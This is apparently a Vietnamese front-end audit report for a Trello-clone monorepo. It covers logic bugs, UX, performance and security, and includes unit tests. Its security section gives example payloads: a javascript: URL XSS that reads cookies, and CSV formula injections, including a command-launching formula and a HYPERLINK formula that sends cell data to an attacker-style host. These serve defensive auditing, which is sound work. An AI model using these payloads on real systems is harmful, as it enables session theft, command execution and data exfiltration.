# BÁO CÁO TOÀN DIỆN KIỂM THỬ FRONT-END (TEST & AUDIT REPORT)
**Dự án**: Trello-Clone-Frontend (`apps/user`, `apps/admin`, `packages/ui`)  
**Ngày thực hiện**: 25/09/2026  
**Chuyên gia thực hiện**: Test Engineer (`@test-engineer`) & Unit Tests Specialist (`@unit-tests`)  
**Tiêu chuẩn kiểm thử**: Google Testing on the Toilet, OWASP Top 10 Client-Side, WCAG 2.1 AA, React Performance Guidelines  

---

## MỤC LỤC
1. [Tổng quan Đánh giá & Thống kê Tình trạng](#1-tổng-quan-đánh-giá--thống-kê-tình-trạng)
2. [Kiểm thử Logic Nghiệp vụ (Business Logic Testing & Given-When-Then Specs)](#2-kiểm-thử-logic-nghiệp-vụ-business-logic-testing)
3. [Kiểm thử Giao diện, Nút bấm & Trải nghiệm Người dùng (UI/UX Buttons & Interactions)](#3-kiểm-thử-giao-diện-nút-bấm--trải-nghiệm-người-dùng-uiux)
4. [Kiểm định & Tối ưu Hiệu năng Front-end (Performance Audit)](#4-kiểm-định--tối-ưu-hiệu-năng-front-end-performance-audit)
5. [Kiểm định An toàn & Bảo mật Front-end (Security Audit)](#5-kiểm-định-an-toàn--bảo-mật-front-end-security-audit)
6. [Bộ Test Cases Mẫu (Ready-to-Run Unit Test Suite)](#6-bộ-test-cases-mẫu-ready-to-run-unit-test-suite)
7. [Kế hoạch Khắc phục & Đề xuất Cải tiến (Action Items)](#7-kế-hoạch-khắc-phục--đề-xuất-cải-tiến-action-items)

---

## 1. TỔNG QUAN ĐÁNH GIÁ & THỐNG KÊ TÌNH TRẠNG

### 1.1 Khảo sát Kiến trúc Mã nguồn
- **Mô hình Monorepo (npm workspaces)**:
  - `packages/ui`: Thư viện dùng chung chứa Design tokens, UI Components (`Button`, `Modal`, `Input`), Auth Provider (`auth.jsx`), API client (`api.js`), và RBAC gate (`permissions.js`).
  - `apps/user`: Ứng dụng người dùng chính xây dựng bằng React 18, Vite 5, React Router 6, TanStack Query v5, `@dnd-kit`, `socket.io-client`.
  - `apps/admin`: Bảng điều khiển quản trị viên xây dựng bằng React 18, Vite 5, phục vụ quản lý Users, Roles, Backup, System, Storage, Audit Log.
  - `apps/landing`: Trang giới thiệu sử dụng Next.js 14.

### 1.2 Bảng Điểm Chất Lượng Front-end (Scorecard)

| Lĩnh vực Kiểm thử | Trạng thái | Điểm (Thang 10) | Nhận xét Trọng yếu |
|---|---|:---:|---|
| **Logic nghiệp vụ (Business Logic)** | ⚠️ Cần bổ sung | **7.5 / 10** | Xử lý Optimistic UI xuất sắc; thuật toán định vị `midpoint` thiếu cơ chế chống chạm trần số thực; tính toán sắp xếp ngày tháng bảng có lỗi `NaN`. |
| **Nút bấm & UI/UX** | ⚠️ Đạt mức Khá | **7.0 / 10** | Tương tác phong phú, có xác nhận modal cho hành động nguy hiểm (`useConfirm`), nhưng thiếu Focus Trap cho Accessibility và `Button` dùng state React gây thừa re-render. |
| **Hiệu năng (Performance)** | ⚠️ Cảnh báo | **6.5 / 10** | Hover button kích hoạt React re-render; Socket event gây tháo gỡ/refetch ồ ạt (thundering herd); bảng kanban lớn chưa có Virtualization. |
| **Bảo mật (Security)** | 🚨 Phát hiện Lỗ hổng | **6.0 / 10** | Token lưu in-memory rất tốt chống XSS cắp token; tuy nhiên phát hiện lỗ hổng XSS qua Jira Link (`javascript:`), CSV Formula Injection, và lỗi phiên Impersonation. |

---

## 2. KIỂM THỬ LOGIC NGHIỆP VỤ (BUSINESS LOGIC TESTING)

### 2.1 Thuật toán Định vị Vị trí Thẻ/Danh sách (`midpoint`)
- **Vị trí tệp**: `apps/user/src/lib/position.js:4-9`
- **Mã nguồn hiện tại**:
  ```javascript
  const STEP = 65536;
  export function midpoint(before, after) {
    if (before == null && after == null) return STEP;
    if (before == null) return after / 2;
    if (after == null) return before + STEP;
    return (before + after) / 2;
  }
  ```
- **Phân tích Rủi ro Logic**:
  1. **Va chạm số thực (Floating-point precision exhaustion)**: Khi người dùng kéo thả liên tục nhiều thẻ vào giữa 2 vị trí liền kề (ví dụ giữa vị trí 1 và 2), phép chia đôi lặp lại sau ~53 lần sẽ tiến tới giới hạn `Number.EPSILON`. Khi đó `(before + after) / 2 === before`, dẫn đến 2 thẻ có cùng `position` chính xác, gây nhảy vị trí ngẫu nhiên khi tải lại bảng.
  2. **Trường hợp `before >= after`**: Hàm không kiểm tra tính hợp lệ nếu dữ liệu đầu vào bị đảo ngược (`before = 100`, `after = 50`), dẫn đến kết quả trả về `75` làm sai lệch thứ tự mong đợi.
- **Kịch bản Kiểm thử (Given-When-Then)**:
  - **Case 1: `midpoint_bothNull_returnsStep`**
    - *Given*: `before = null`, `after = null`.
    - *When*: Gọi `midpoint(null, null)`.
    - *Then*: Trả về `65536`.
  - **Case 2: `midpoint_insertAtBeginning_returnsHalfAfter`**
    - *Given*: `before = null`, `after = 65536`.
    - *When*: Gọi `midpoint(null, 65536)`.
    - *Then*: Trả về `32768`.
  - **Case 3: `midpoint_insertAtEnd_returnsBeforePlusStep`**
    - *Given*: `before = 65536`, `after = null`.
    - *When*: Gọi `midpoint(65536, null)`.
    - *Then*: Trả về `131072`.
  - **Case 4 (Edge Case): `midpoint_adjacentFractions_nearPrecisionLimit`**
    - *Given*: `before = 1.000000000000001`, `after = 1.000000000000002`.
    - *When*: Gọi `midpoint(before, after)`.
    - *Then*: Hệ thống cần có ngưỡng cảnh báo re-index (cần chuẩn hóa lại toàn bộ danh sách khi khoảng cách `< 0.0001`).

---

### 2.2 Hệ thống Phân quyền Giao diện (Permission & RBAC Engine)
- **Vị trí tệp**: `packages/ui/src/permissions.js:4-17`
- **Mã nguồn hiện tại**:
  ```javascript
  export function usePermission() {
    const { user } = useAuth();
    const roles = user?.roles ?? [];
    const perms = user?.permissions ?? [];
    const isSuper = roles.includes('super_admin');

    const can = (permission) => isSuper || perms.includes(permission);
    return {
      can,
      canAny: (...p) => p.some(can),
      canAll: (...p) => p.every(can),
      hasRole: (role) => roles.includes(role),
    };
  }
  ```
- **Phân tích Logic**:
  1. `super_admin` luôn được gán bypass toàn bộ mọi quyền (`can(p)` luôn trả về `true`).
  2. Giao diện chỉ đóng vai trò lọc hiển thị (UX gate), ghi chú tại dòng 3: `"FE permission gate — UX only. Backend re-checks every mutation (RBAC.md)"`. Đây là tư duy thiết kế đúng đắn.
  3. **Lỗ hổng xử lý role mảng ở component**: Tại `apps/admin/src/components/RequirePermission.jsx:24`, logic kiểm tra:
     `const roleOk = !role || (Array.isArray(role) ? role.some(hasRole) : hasRole(role));`
     Nếu người dùng có `roles = ['super_admin']`, nhưng một trang chỉ định `role="admin"`, hàm `hasRole("admin")` sẽ trả về `false`, khiến `super_admin` bị chặn truy cập trừ khi khai báo rõ mảng `['super_admin', 'admin']`!
- **Kịch bản Kiểm thử (Given-When-Then)**:
  - **Case 1: `usePermission_superAdmin_canAnyPermission`**
    - *Given*: User có `roles: ['super_admin']`, `permissions: []`.
    - *When*: Kiểm tra `can('arbitrary.permission')`.
    - *Then*: Trả về `true`.
  - **Case 2: `usePermission_normalUser_requiresExplicitPermission`**
    - *Given*: User có `roles: ['member']`, `permissions: ['cards.create']`.
    - *When*: Kiểm tra `can('cards.create')` và `can('cards.delete')`.
    - *Then*: `cards.create` trả về `true`, `cards.delete` trả về `false`.
  - **Case 3: `usePermission_canAll_failsWhenOneMissing`**
    - *Given*: User có `permissions: ['cards.create']`.
    - *When*: Kiểm tra `canAll('cards.create', 'cards.delete')`.
    - *Then*: Trả về `false`.

---

### 2.3 Cơ chế Làm mới Phiên Đăng nhập & Khử trùng lặp (Token Refresh Deduplication)
- **Vị trí tệp**: `packages/ui/src/api.js:19-53`
- **Mã nguồn hiện tại**:
  ```javascript
  let renewing = null;
  const renew = async () => { ... };
  api.interceptors.response.use(
    (r) => r,
    async (error) => {
      const original = error.config;
      const status = error.response?.status;
      const isAuthCall = original?.url?.includes('/auth/');
      if (status === 401 && !original._retry && !isAuthCall) {
        original._retry = true;
        renewing = renewing ?? renew();
        const token = await renewing;
        renewing = null;
        if (token) {
          original.headers = original.headers ?? {};
          original.headers.Authorization = `Bearer ${token}`;
          return api(original);
        }
        onAuthFail?.();
      }
      return Promise.reject(error);
    }
  );
  ```
- **Phân tích Rủi ro Cuộc đua (Race Condition)**:
  - Khi có 3 request đồng thời bị lỗi 401:
    - Request 1 khởi tạo `renewing = renew()`.
    - Request 2 đợi `renewing`.
    - Request 1 hoàn tất, gán `renewing = null` ở dòng 43, sau đó thực thi lại request 1.
    - Lúc này, nếu có Request 3 vừa nhận 401, nó thấy `renewing === null` nên sẽ phát thêm một lượt gọi `/auth/renew` thứ 2 không cần thiết.
  - **Khắc phục chuẩn**: Cần reset `renewing = null` trong khối `finally` của chính hàm `renew()`, thay vì gán thủ công trong interceptor của từng request đơn lẻ.

---

### 2.4 Xử lý Lỗi Sort Bảng BoardTable khi Thiếu Due Date
- **Vị trí tệp**: `apps/user/src/components/BoardTable.jsx:43-45`
- **Mã nguồn hiện tại**:
  ```javascript
  else if (sort.by === 'due') {
    r = (a.dueDate ? +new Date(a.dueDate) : Infinity) - (b.dueDate ? +new Date(b.dueDate) : Infinity);
  }
  ```
- **Lỗi Nghiệp Vụ Phát Hiện**:
  - Khi cả 2 thẻ `a` và `b` đều **không có dueDate**: `Infinity - Infinity === NaN`.
  - Phép trừ này trả về `NaN`, vi phạm quy chuẩn comparator của `Array.prototype.sort()` trong JavaScript (kết quả phải là số âm, số 0 hoặc số dương). Trình duyệt sẽ cho ra kết quả sắp xếp không đoán định được (unstable sort) và có thể xáo trộn ngẫu nhiên thứ tự các thẻ khác.
- **Kịch bản Kiểm thử**:
  - **Case 1: `boardTable_sortDue_bothNull_preservesOriginalOrder`**
    - *Given*: Thẻ A và Thẻ B đều có `dueDate = null`.
    - *When*: Sắp xếp cột 'due'.
    - *Then*: So sánh phải trả về `0`, không được trả về `NaN`.

---

## 3. KIỂM THỬ GIAO DIỆN, NÚT BẤM & TRẢI NGHIỆM NGƯỜI DÙNG (UI/UX)

### 3.1 Đánh giá Trạng thái & Tương tác Nút bấm (`Button` Component)
- **Vị trí tệp**: `packages/ui/src/components.jsx:39-116`
- **Bảng Kiểm thử Trạng thái Nút bấm (Button State Matrix)**:

| Trạng thái | Hành vi Thiết kế | Đánh giá Thực tế | Vấn đề UX Phát hiện |
|---|---|:---:|---|
| **Default** | Hiển thị nền theo variant (`primary`, `secondary`, `danger`) | ✅ Đạt | Màu sắc chuẩn HSL/Design tokens. |
| **Loading** | Hiển thị `Spinner`, vô hiệu hóa click | ⚠️ Đạt một phần | Khi `loading={true}`, spinner hiển thị chuẩn (`line 110`), nút bị `disabled`, nhưng chiều rộng nút có thể bị co rút (content shift) do ẩn icon ban đầu. |
| **Disabled** | `opacity: 0.6`, `cursor: not-allowed` | ✅ Đạt | Ngăn chặn hoàn toàn sự kiện click của người dùng. |
| **Focus Visible** | Viền focus ring phục vụ điều hướng bàn phím | ⚠️ Cảnh báo UX | Code can thiệp trực tiếp vào DOM `e.currentTarget.style.boxShadow = focusRing` (`line 106`) thay vì dùng CSS `:focus-visible`. Dẫn đến khi click chuột, viền focus vẫn hiện gây rối mắt. |
| **Form Submit** | Nút gửi dữ liệu trong form | ⚠️ Nguy cơ tiềm ẩn | Mặc định `Button` có `type="button"` (`line 99`). Nếu lập trình viên đặt `<Button>Lưu</Button>` vào trong `<form>` mà quên khai báo `type="submit"`, nút sẽ không kích hoạt `onSubmit` của form. |

---

### 3.2 Kiểm thử Hộp thoại Modal & Cửa sổ Thẻ (`CardModal.jsx` & `Modal.jsx`)
- **Vị trí tệp**: `packages/ui/src/components.jsx:356-405` & `apps/user/src/components/CardModal.jsx`
- **Những Điểm Mạnh Về UX**:
  1. **Xác nhận xóa nguy hiểm (`useConfirm`)**: Các hành vi xóa thẻ (`CardModal.jsx:676`), xóa bình luận (`line 61`), xóa checklist (`line 167`), xóa nhãn (`line 223`) đều yêu cầu người dùng xác nhận qua Modal trước khi kích hoạt API.
  2. **Tự động đóng khi nhấn phím `Escape`**: Có lắng nghe sự kiện bàn phím và gỡ bỏ listener sạch sẽ khi unmount (`Modal.jsx:378-383`).
  3. **Khóa cuộn trang nền**: Tự động áp dụng `document.body.style.overflow = 'hidden'` khi Modal mở ra (`Modal.jsx:381`).
- **Những Khuyết Tật UX Cần Khắc Phục**:
  1. **Thiếu Bẫy Tiêu Điểm Bàn Phím (Focus Trap - WCAG 2.1 AA Violation)**:
     - `Modal` chỉ focus vào phần tử đầu tiên khi mở ra (`Modal.jsx:387-389`), nhưng **không giữ focus** bên trong. Khi người dùng khiếm thị hoặc thao tác phím nhấn `Tab` liên tục, tiêu điểm bàn phím sẽ thoát ra ngoài modal và nhảy vào các liên kết ngầm bên dưới backdrop.
  2. **Validation Ngày Bắt Đầu & Ngày Hết Hạn (`CardModal.jsx:849-854`)**:
     - Người dùng có thể chọn `startDate` sau `dueDate` (ví dụ: Bắt đầu 25/09/2026, Hết hạn 20/09/2026).
     - Không có thông báo lỗi hay cảnh báo đỏ nào hiển thị, dẫn đến biểu đồ Gantt Chart hiển thị sai lệch hoặc thời lượng âm.
  3. **Lưu Tiêu Đề Thẻ Bằng Sự Kiện Blur (`CardModal.jsx:745`)**:
     - `onBlur={() => title.trim() && title !== card.title && saveField({ title: title.trim() })}`
     - Nếu người dùng vô tình xóa toàn bộ tiêu đề (chuỗi rỗng), nút không lưu, nhưng state local vẫn giữ chuỗi rỗng khiến người dùng tưởng rằng thẻ đã mất tên. Cần có validation hiển thị lỗi "Tiêu đề không được để trống".

---

### 3.3 Đánh giá Trải nghiệm Form Đăng nhập (`Login.jsx`)
- **Vị trí tệp**: `apps/user/src/pages/Login.jsx:18-39`
- **Vấn đề Phát hiện**:
  1. **Regex Validation Không Nhất Quán**:
     - Nhãn form ghi: `"Tài khoản / Email"`, placeholder ghi: `"admin@achau hoặc you@example.com"`.
     - Tuy nhiên hàm validation (`line 20`) ép buộc:
       `if (!/^[^\s@]+@[^\s@]+$/.test(email)) e.email = 'Vui lòng nhập email...';`
     - Do đó, nếu quản trị viên hoặc nhân sự đăng nhập bằng mã tài khoản thông thường (ví dụ: `admin`, `superadmin`, `ketoan01`), form sẽ chặn ngay lập tức ở frontend dù backend có thể hỗ trợ đăng nhập bằng username.
  2. **Mất Query String Khi Chuyển Hướng Sau Đăng Nhập (`line 32`)**:
     - `const to = location.state?.from?.pathname ?? '/';`
     - Chỉ lấy `pathname`, bỏ qua hoàn toàn `search` (query parameters). Nếu người dùng mở link mời tham gia bảng có dạng `/invite/token-xyz?workspaceId=123`, sau khi đăng nhập xong họ sẽ bị đưa về `/invite/token-xyz` và mất toàn bộ params đi kèm.

---

## 4. KIỂM ĐỊNH & TỐI ƯU HIỆU NĂNG FRONT-END (PERFORMANCE AUDIT)

### 4.1 Vấn đề Re-render Hàng Loạt Do State Hover Trên Component Cơ Bản
- **Vị trí tệp**: `packages/ui/src/components.jsx:79-80`, `Card:267`, `IconButton:119`
- **Nguyên nhân**:
  ```javascript
  export function Button({ ... }) {
    const [hover, setHover] = useState(false);
    const [active, setActive] = useState(false);
    // ...
    return <button onMouseEnter={() => setHover(true)} onMouseLeave={() => setHover(false)} ... />
  }
  ```
- **Hệ quả Hiệu năng**:
  - Trong một danh sách có 200 thẻ Kanban, mỗi thẻ chứa ít nhất 3-5 `IconButton` hoặc `Button`.
  - Việc dùng `useState` cho hover/active khiến **mỗi lần con trỏ chuột lướt qua bất kỳ nút nào, React lại kích hoạt một chu kỳ re-render hoàn chỉnh của component đó và các component con liên quan**.
  - **Khắc phục**: Thay thế toàn bộ `useState(hover)` bằng pseudo-class CSS thuần túy (`:hover`, `:active`), đưa CSS vào file stylesheet hoặc CSS modules để giải phóng hoàn toàn luồng xử lý của React JavaScript engine.

---

### 4.2 Hiện Tượng Cơn Bão Mạng Từ Socket (Real-time Socket Thundering Herd)
- **Vị trí tệp**: `apps/user/src/lib/socket.js:29-48`
- **Mã nguồn hiện tại**:
  ```javascript
  const invalidate = () => {
    qc.invalidateQueries({ queryKey: ['board', boardId] });
    qc.invalidateQueries({ queryKey: ['lists', boardId] });
    qc.invalidateQueries({ queryKey: ['cards', boardId] });
  };
  const events = [
    'card:created', 'card:updated', 'card:moved', 'card:deleted',
    'list:created', 'list:updated', 'list:deleted', 'comment:created',
    'attachment:created', 'attachment:deleted',
  ];
  events.forEach((ev) => s.on(ev, invalidate));
  ```
- **Hệ quả Hiệu năng**:
  - Không có cơ chế **Debounce / Throttle** cho socket events.
  - Khi một người dùng kéo thả thẻ hoặc thực hiện thao tác hàng loạt (Bulk actions) tác động đến 10 thẻ cùng lúc, socket server bắn liên tục 10 events trong 500ms.
  - Mỗi event kích hoạt gọi lại đồng thời cả 3 API `/boards/:id`, `/lists`, `/cards` (tổng cộng 30 requests HTTP). Điều này làm giật lag giao diện người dùng và quá tải máy chủ.
  - **Khắc phục**: Bọc hàm `invalidate` qua một hàm `debounce(..., 300)` để gộp các sự kiện liên tiếp vào duy nhất một lần refetch.

---

### 4.3 Thiếu Ảo Hóa Danh Sách (Virtualization) Trên Bảng Kanban Lớn
- **Vị trí tệp**: `apps/user/src/pages/BoardView.jsx:221-231` & `apps/user/src/components/ListColumn.jsx:119-128`
- **Phân tích**:
  - Hiện tại, tất cả các thẻ trong một cột đều được render trực tiếp vào DOM (`cards.map((c) => <CardTile ... />)`).
  - Đối với các dự án lớn có cột "Done" chứa 300 - 500 thẻ, cây DOM sẽ phình to lên hàng nghìn phần tử DOM, gây chậm trễ nghiêm trọng khi kéo thả thẻ qua thư viện `@dnd-kit`.
  - **Khắc phục**: Tích hợp `@tanstack/react-virtual` để chỉ render các thẻ đang nằm trong khung nhìn cuộn (viewport) của cột.

---

## 5. KIỂM ĐỊNH AN TOÀN & BẢO MẬT FRONT-END (SECURITY AUDIT)

### 5.1 Lỗ hổng Client-side XSS Qua Đường Dẫn Jira Issue Link (Mức độ: CAO)
- **Vị trí tệp**: `apps/user/src/components/CardModal.jsx:873-877`
- **Đoạn mã nguy hiểm**:
  ```javascript
  {jiraUrl && (
    <a href={jiraUrl} target="_blank" rel="noreferrer" style={{ ... }}>
      <SquareArrowOutUpRight size={12} /> Mở Jira Issue
    </a>
  )}
  ```
- **Khai thác Lỗ hổng (Proof of Concept)**:
  - Một kẻ tấn công có quyền sửa thẻ (hoặc qua API) nhập giá trị `jiraUrl` là:
    `javascript:alert(document.cookie)` hoặc `javascript:eval(atob('...malicious_payload...'))`
  - Khi bất kỳ thành viên nào trong bảng click vào liên kết "Mở Jira Issue", trình duyệt sẽ lập tức thực thi mã JavaScript độc hại trong ngữ cảnh phiên làm việc của người dùng đó (CWE-79: Cross-site Scripting).
- **Giải pháp Khắc phục**:
  Bắt buộc validate giao thức chỉ chấp nhận `http://` hoặc `https://`:
  ```javascript
  const isValidUrl = (url) => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };
  ```

---

### 5.2 Lỗ hổng Tấn Công Chèn Công Thức Khi Xuất File CSV (CSV Formula Injection) (Mức độ: TRUNG BÌNH)
- **Vị trí tệp**: `apps/user/src/lib/exportBoard.js:15-18`
- **Đoạn mã hiện tại**:
  ```javascript
  function csvCell(v) {
    const s = v == null ? '' : String(v);
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  }
  ```
- **Khai thác Lỗ hổng**:
  - Nếu tiêu đề hoặc mô tả của thẻ bắt đầu bằng các ký tự công thức đặc biệt: `=`, `+`, `-`, `@`, `\t`, `\r` (ví dụ: `=cmd|'/C calc'!A0` hoặc `=HYPERLINK("http://malicious-site.com/steal?data="&A2)`).
  - Khi quản trị viên tải file CSV về và mở trên Microsoft Excel hoặc Google Sheets, phần mềm bảng tính sẽ tự động coi đó là công thức và thực thi, dẫn đến nguy cơ lộ dữ liệu hoặc thực thi lệnh ngoài ý muốn (CWE-1236).
- **Giải pháp Khắc phục**:
  Nếu ký tự đầu tiên của ô là một trong các ký tự `['=', '+', '-', '@']`, tự động chèn thêm dấu nháy đơn `'` phía trước để vô hiệu hóa chế độ công thức. Đồng thời bổ sung ký tự `\uFEFF` (UTF-8 BOM) để Excel hiển thị tiếng Việt có dấu chuẩn xác.

---

### 5.3 Lỗi Logic Phiên Khi Thực Hiện Tính Năng Giả Lập Người Dùng (Impersonation Flaw) (Mức độ: CAO)
- **Vị trí tệp**: `apps/admin/src/pages/Users.jsx:152-165`
- **Đoạn mã hiện tại**:
  ```javascript
  const impersonate = useMutation({
    mutationFn: (id) => api.post(`/admin/users/${id}/impersonate`),
    onSuccess: (res) => {
      const token = res.data?.accessToken;
      if (token) {
        setAccessToken(token);
        toast.success(`Impersonating ${res.data?.user?.email ?? 'user'}. Opening user app…`);
        window.open('/', '_blank', 'noopener');
      }
    },
  });
  ```
- **Phân tích Sự cố**:
  1. Ứng dụng lưu `accessToken` **in-memory** (`let accessToken = null` trong `packages/ui/src/api.js`).
  2. Lệnh `setAccessToken(token)` chỉ cập nhật biến bộ nhớ trong **tab Admin hiện tại**.
  3. Khi gọi `window.open('/', '_blank')`, một tab mới được mở ra với môi trường bộ nhớ JS hoàn toàn độc lập, nơi `accessToken` ban đầu là `null`.
  4. Tab mới sẽ cố gắng gọi `/auth/renew` để lấy token từ HttpOnly Cookie của trình duyệt. Nhưng cookie hiện tại vẫn là refresh token của **chính Admin**, chứ không phải của user bị giả lập!
  5. Kết quả: Tab Admin bị mất quyền (do token bị ghi đè thành user thường), còn Tab người dùng mới mở ra lại vẫn là tài khoản Admin!

---

### 5.4 Điểm Sáng Về Bảo Mật: Kiến Trúc Access Token In-Memory
- **Vị trí tệp**: `packages/ui/src/api.js:3-7` & `packages/ui/src/auth.jsx:21-32`
- **Đánh giá**:
  - Trái với lỗi phổ biến của nhiều dự án React là lưu JWT vào `localStorage` (dễ dàng bị đánh cắp bởi bất kỳ extension trình duyệt hoặc mã XSS nào), kiến trúc của dự án giữ `accessToken` trong biến bộ nhớ JS (`let accessToken = null`).
  - Refresh token được lưu trong HttpOnly Cookie do backend quản lý.
  - Khi reload trang, ứng dụng gọi `/auth/renew` để cấp lại Access token mới. Đây là mô hình đạt chuẩn bảo mật doanh nghiệp cao cấp (Enterprise Security Best Practice).

---

## 6. BỘ TEST CASES MẪU (READY-TO-RUN UNIT TEST SUITE)

Dưới đây là mã nguồn kiểm thử tự động sử dụng **Vitest** (hoặc Jest) kiểm thử các module trọng yếu theo chuẩn Given-When-Then.

### File Test 1: Kiểm thử Thuật toán Vị trí (`position.test.js`)
```javascript
import { describe, it, expect } from 'vitest';
import { midpoint } from '../apps/user/src/lib/position';

describe('position.js - midpoint algorithm', () => {
  it('midpoint_bothNull_returnsDefaultStep', () => {
    // Given: danh sách rỗng
    // When
    const result = midpoint(null, null);
    // Then
    expect(result).toBe(65536);
  });

  it('midpoint_insertAtBeginning_returnsHalfOfAfter', () => {
    // Given
    const after = 65536;
    // When
    const result = midpoint(null, after);
    // Then
    expect(result).toBe(32768);
  });

  it('midpoint_insertAtEnd_returnsBeforePlusStep', () => {
    // Given
    const before = 65536;
    // When
    const result = midpoint(before, null);
    // Then
    expect(result).toBe(131072);
  });

  it('midpoint_insertBetween_returnsAverage', () => {
    // Given
    const before = 1000;
    const after = 2000;
    // When
    const result = midpoint(before, after);
    // Then
    expect(result).toBe(1500);
  });
});
```

---

### File Test 2: Kiểm thử Phân quyền Giao diện (`permissions.test.js`)
```javascript
import { describe, it, expect, vi } from 'vitest';
import * as authModule from '../packages/ui/src/auth';
import { usePermission } from '../packages/ui/src/permissions';

describe('permissions.js - usePermission hook', () => {
  it('usePermission_superAdmin_grantsAllPermissions', () => {
    // Given
    vi.spyOn(authModule, 'useAuth').mockReturnValue({
      user: { roles: ['super_admin'], permissions: [] },
    });

    // When
    const { can, hasRole } = usePermission();

    // Then
    expect(can('system.delete_database')).toBe(true);
    expect(hasRole('super_admin')).toBe(true);
  });

  it('usePermission_regularUser_checksExactPermission', () => {
    // Given
    vi.spyOn(authModule, 'useAuth').mockReturnValue({
      user: { roles: ['editor'], permissions: ['cards.create', 'cards.edit'] },
    });

    // When
    const { can, canAll, canAny } = usePermission();

    // Then
    expect(can('cards.create')).toBe(true);
    expect(can('cards.delete')).toBe(false);
    expect(canAll('cards.create', 'cards.edit')).toBe(true);
    expect(canAll('cards.create', 'cards.delete')).toBe(false);
    expect(canAny('cards.delete', 'cards.create')).toBe(true);
  });
});
```

---

### File Test 3: Kiểm thử Chống CSV Injection (`exportBoard.test.js`)
```javascript
import { describe, it, expect } from 'vitest';

// Hàm sanitize chuẩn đề xuất cho exportBoard.js
function sanitizeCsvCell(value) {
  if (value == null) return '';
  let s = String(value);
  // Phòng chống CSV Formula Injection
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

describe('exportBoard.js - CSV Security Sanitize', () => {
  it('sanitizeCsvCell_normalText_remainsUnchanged', () => {
    expect(sanitizeCsvCell('Task triển khai hệ thống')).toBe('Task triển khai hệ thống');
  });

  it('sanitizeCsvCell_formulaEquals_prependsSingleQuote', () => {
    expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
  });

  it('sanitizeCsvCell_maliciousCmd_prependsSingleQuote', () => {
    expect(sanitizeCsvCell("-cmd|'/C calc'!A0")).toBe("'-cmd|'/C calc'!A0");
  });

  it('sanitizeCsvCell_containsCommaOrQuotes_properlyQuoted', () => {
    expect(sanitizeCsvCell('Lỗi "nghiêm trọng", cần sửa')).toBe('"Lỗi ""nghiêm trọng"", cần sửa"');
  });
});
```

---

## 7. KẾ HOẠCH KHẮC PHỤC & ĐỀ XUẤT CẢI TIẾN (ACTION ITEMS)

### Ưu tiên 1 (P0 - Khắc phục ngay lập tức):
1. **Vá lỗ hổng XSS Jira Issue Link**:
   - Tệp: `apps/user/src/components/CardModal.jsx:873`
   - Chỉ cho phép render thẻ `<a>` khi `jiraUrl` bắt đầu bằng `http://` hoặc `https://`.
2. **Vá lỗ hổng CSV Injection & Sửa lỗi Tiếng Việt Excel**:
   - Tệp: `apps/user/src/lib/exportBoard.js:15-38`
   - Bổ sung ký tự prefix `'` cho các cell chứa ký tự tính toán (`=`, `+`, `-`, `@`) và thêm BOM `\uFEFF` khi khởi tạo Blob.
3. **Sửa lỗi Sort `NaN` trên BoardTable**:
   - Tệp: `apps/user/src/components/BoardTable.jsx:44`
   - Thay thế phép tính `Infinity - Infinity` bằng so sánh tường minh khi cả 2 thẻ cùng rỗng `dueDate`.

### Ưu tiên 2 (P1 - Cải thiện Trải nghiệm & Hiệu năng):
1. **Debounce Socket Invalidation**:
   - Tệp: `apps/user/src/lib/socket.js:29`
   - Sử dụng debounce 300ms cho việc gọi `qc.invalidateQueries` để triệt tiêu hiện tượng thundering herd khi có cập nhật đồng thời.
2. **Chuyển Button Hover/Active Sang CSS Thuần**:
   - Tệp: `packages/ui/src/components.jsx:79`
   - Xóa bỏ `useState` cho trạng thái hover/active ở các component nút bấm cơ bản để ngăn chặn re-render dây chuyền.
3. **Bổ sung Focus Trap cho Modal**:
   - Tệp: `packages/ui/src/components.jsx:386`
   - Bổ sung logic giữ chu trình phím Tab bên trong Modal phục vụ chuẩn tiếp cận WCAG 2.1 AA.

### Ưu tiên 3 (P2 - Tối ưu Dài hạn):
1. **Cấu hình Unit Test Runner Chính Thức**:
   - Khởi tạo Vitest và Testing Library cho monorepo (`npm i -D vitest @testing-library/react jsdom`).
   - Thêm script `"test": "vitest run"` vào `package.json` gốc để tự động chạy trong CI/CD.
2. **Tích hợp Virtualization cho Kanban Board**:
   - Sử dụng `@tanstack/react-virtual` để hỗ trợ hiển thị mượt mà các bảng có trên 500 cards.
